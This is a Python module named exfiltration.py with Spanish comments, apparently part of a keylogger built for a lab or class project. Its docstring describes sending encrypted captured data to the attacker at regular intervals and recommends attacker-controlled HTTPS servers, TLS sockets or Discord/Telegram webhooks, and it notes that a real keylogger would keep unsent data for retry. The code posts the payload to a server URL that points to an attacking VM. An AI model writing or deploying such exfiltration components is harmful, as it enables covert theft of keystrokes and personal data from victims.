"""
exfiltration.py
Módulo responsable de enviar los datos cifrados al atacante de forma periódica.

Opciones recomendadas para el proyecto:
1. HTTPS POST a un servidor Flask/FastAPI controlado por ti (mejor opción).
2. Socket TCP con TLS.
3. Para pruebas muy simples: guardar en archivo local o usar webhook (Discord/Telegram) + cifrado.

En este archivo implementaremos un cliente HTTP simple usando 'requests'.
El servidor debe estar corriendo en otra máquina virtual o con túnel (ngrok).
"""

import requests
import json
from config import SERVER_URL
from datetime import datetime


def send_encrypted_data(encrypted_payload: str) -> bool:
    """
    Envía el payload cifrado (base64) al receptor vía HTTP POST.
    SERVER_URL apunta a la VM atacante (config.py). El JSON viaja en texto plano
    pero el campo 'payload' es ilegible sin secret.key.
    """
    try:
        data = {
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "payload": encrypted_payload,
        }

        response = requests.post(
            SERVER_URL,  # ej: http://192.168.56.108:5000/upload
            json=data,
            timeout=10,
            headers={"Content-Type": "application/json"}
        )

        if response.status_code == 200:
            print(f"[+] Datos enviados exitosamente. Respuesta: {response.text}")
            return True
        else:
            print(f"[-] Error del servidor: {response.status_code} - {response.text}")
            return False

    except requests.exceptions.RequestException as e:
        print(f"[-] Error de conexión al enviar datos: {e}")
        # En un keylogger real se guardaría en disco para reintento posterior
        return False
